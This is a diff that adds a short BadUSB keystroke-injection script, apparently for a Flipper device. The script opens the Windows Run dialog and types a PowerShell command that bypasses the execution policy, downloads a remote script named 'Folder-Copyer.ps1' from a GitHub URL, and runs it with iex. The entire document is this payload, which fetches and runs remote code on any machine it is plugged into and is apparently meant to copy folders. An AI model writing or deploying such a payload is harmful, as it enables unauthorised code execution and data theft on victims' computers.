@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -NoP -Exec Bypass "irm https://raw.githubusercontent.com/Ertonbax/Flipper-BadUSB/refs/heads/main/Payloads/Folder-Copyer.ps1 | iex"
+ENTER
